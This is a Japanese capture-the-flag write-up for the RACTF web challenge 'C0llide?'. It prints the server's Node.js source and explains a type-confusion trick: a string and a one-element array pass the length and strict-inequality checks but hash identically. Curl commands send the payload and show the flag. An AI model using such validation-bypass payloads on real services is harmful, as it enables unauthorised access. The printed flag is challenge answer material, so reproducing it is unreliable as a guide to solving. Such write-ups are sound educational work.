# C0llide?:Web:250pts
Challenge instance ready at 95.216.233.106:30741.  
A target service is asking for two bits of information that have the same "custom hash", but can't be identical. Looks like we're going to have to generate a collision?  

# Solution
アクセスするとJavaScriptのソースが見える。  
```JavaScript:app.js
const bodyParser = require("body-parser")
const express = require("express")
const fs = require("fs")
const customhash = require("./customhash")

const app = express()
app.use(bodyParser.json())

const port = 3000
const flag = "flag"
const secret_key = "Y0ure_g01nG_t0_h4v3_t0_go_1nto_h4rdc0r3_h4ck1ng_m0d3"

app.get('/', (req, res) => {
    console.log("[-] Source view")
    res.type("text")
    return fs.readFile("index.js", (err,data) => res.send(data.toString().replace(flag, "flag")))
})

app.post('/getflag', (req, res) => {
    console.log("[-] Getflag post")
    if (!req.body) {return res.send("400")}
    let one = req.body.one
    let two = req.body.two
    console.log(req.body)
    if (!one || !two) {
        return res.send("400")
    }
    if ((one.length !== two.length) || (one === two)) {
        return res.send("Strings are either too different or not different enough")
    }
    one = customhash.hash(secret_key + one)
    two = customhash.hash(secret_key + two)
    if (one == two) {
        console.log("[*] Flag get!")
        return res.send(flag)
    } else {
        return res.send(`${one} did not match ${two}!`)
    }
})

app.listen(port, () => console.log(`Listening on port ${port}`))
```
/にGETするとソースが見え、/getflagにPOSTするとcustomhashのコリジョンをチェックするようだ。  
```bash
$ curl -X POST -H "Content-type: application/json" -d "{\"one\":1,\"two\":2}" http://95.216.233.106:30741/getflag
75465de2045788dd0c5816b7f325d7f3 did not match 190bba7b59ef3ad7b06b764a912d837f!
```
hashを見てみるとmd5のようだが、コリジョンができるか怪しい。  
js側をごまかせないかと考える。  
以下の部分に注目する。  
```JavaScript
~~~
    let one = req.body.one
    let two = req.body.two
~~~
    if ((one.length !== two.length) || (one === two)) {
        return res.send("Strings are either too different or not different enough")
    }
    one = customhash.hash(secret_key + one)
    two = customhash.hash(secret_key + two)
~~~
```
ここでは厳密等価演算子を使って、長さが違うものと値が等しいものをブロックしている。  
つまり要求は、長さが同じかつ値が異なるかつハッシュが衝突することである。  
無理に思えるが、letによって配列などを渡せる。  
さらに`secret_key + one`と`secret_key + two`ではどんな値でも文字列結合される。  
ブラウザなどのコンソールで試すと以下のようになる。  
```JavaScript
>> "1".length !== [1].length
<- false
>> "1" === [1]
<- false
>> "Test"+"1"
<- "Test1"
>> "Test"+[1]
<- "Test1"
```
よって以下のようにコリジョンさせられる。  
```bash
$ curl -X POST -H "Content-type: application/json" -d "{\"one\":\"1\",\"two\":[1]}" http://95.216.233.106:30741/getflag
ractf{Y0u_R_ab0uT_2_h4Ck_t1Me__4re_u_sur3?}
```

## ractf{Y0u_R_ab0uT_2_h4Ck_t1Me__4re_u_sur3?}